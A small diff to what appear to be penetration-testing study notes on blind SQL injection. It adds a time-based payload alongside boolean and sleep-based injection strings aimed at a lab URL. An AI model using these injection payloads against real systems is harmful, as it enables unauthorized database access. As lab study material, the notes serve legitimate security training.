@@ -65,6 +65,8 @@ blind sql injections - bool and time, can't see output returned from database
 ```
 http://192.168.206.16/blindsqli.php?user=offsec' AND 1=1 -- //
 offsec' AND IF (1=1, sleep(3),'false') -- //
+
+/ AND IF (1=1, sleep(3),'false') -- //
 ```
 
 # Manual code execution
